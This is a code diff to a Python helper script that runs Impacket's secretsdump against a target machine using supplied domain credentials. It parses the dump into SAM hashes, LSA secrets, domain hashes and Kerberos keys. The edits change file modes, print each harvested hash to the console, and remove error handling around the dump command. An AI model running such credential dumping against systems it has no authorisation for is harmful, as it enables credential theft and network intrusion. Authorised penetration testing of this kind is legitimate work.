@@ -45,7 +45,7 @@ def get_domain_name(filepath):
 
 def get_NTML_hash(filepath):
     try:
-        with open(filepath, 'r') as f, open('./output.txt', 'w') as of:
+        with open(filepath, 'r') as f, open('./output.txt', 'a') as of:
             for line in f:
                 if line.strip().startswith('RID  :') or line.strip().startswith('User :'):
                     of.write(line.strip() + "\n")
@@ -119,24 +119,23 @@ def process_secrets_dump(filepath):
                 kerberos_info.append(line.strip())
                 print("appended KERBEROS")
     try:
-        with open('./output.txt', 'a') as of:
+        with open('./output.txt', 'w') as of:
             of.write("Local SAM Hashes:\n")
             for hash in sam_hashes:
                 of.write(f"{hash}\n")
-                #print(f"Written {hash}")
+                print(f"{hash}")
             of.write("\nLSA Secrets:\n")
             for lsahash in lsa_hashes:
                 of.write(f"{lsahash}\n")
-                #print(f"Written {lsahash}")
+                print(f"{lsahash}")
             of.write("\nDomains:\n")
             for domainhash in domain_hashes:
                 of.write(f"{domainhash}\n")
-                #print(f"Written {domainhash}")
+                print(f"{domainhash}")
             of.write("\nKerberos keys:\n")
             for key in kerberos_info:
                 of.write(f"{key}\n")
-                #print(f"Written {key}")
-
+                print(f"{key}")
     except Exception as e:
         print(f"Error: {e}")
 
@@ -174,10 +173,7 @@ while validTargetIP is False:
 # FIND A WAY TO CREATE FOLDER TO SAVE TO.
 secCommand = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\secOutput.txt"
 
-try:
-    os.system(secCommand)
-except KeyError as e:
-    print(f"There was an error: {e}")
+os.system(secCommand)
 
 # Use the process function and see if it works to filter out useless info. Needs input path
 process_secrets_dump("c:\\temp\\secOutput.txt")
